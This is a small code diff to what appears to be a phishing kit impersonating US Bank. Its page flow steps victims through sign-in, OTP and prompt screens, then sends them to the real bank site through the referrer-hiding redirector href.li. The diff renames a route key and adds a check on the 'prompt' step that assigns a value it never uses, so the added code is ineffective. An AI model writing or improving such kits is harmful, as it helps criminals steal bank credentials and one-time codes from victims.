@@ -289,7 +289,7 @@ const routeMap = {
   auth: "sign-in?action=auth",
   otp: "sign-in?action=otp",
   prompt: "sign-in?action=prompt",
-  failed: "sign-in?action=fail",
+  fail: "sign-in?action=fail",
   final: "https://href.li/?https://usbank.com"
 };
 
@@ -318,6 +318,10 @@ async function getNextPage(currentPage, req) {
   if (!pageFlow || typeof pageFlow !== "object") return null;
 
   const backendCurrent = resolveBackendRoute(currentPage);
+  
+  if (backendCurrent === "prompt") {
+  const forcedRoute = resolveFrontendRoute("fail");
+ }
 
   const sortedKeys = Object.keys(pageFlow)
     .map(Number)
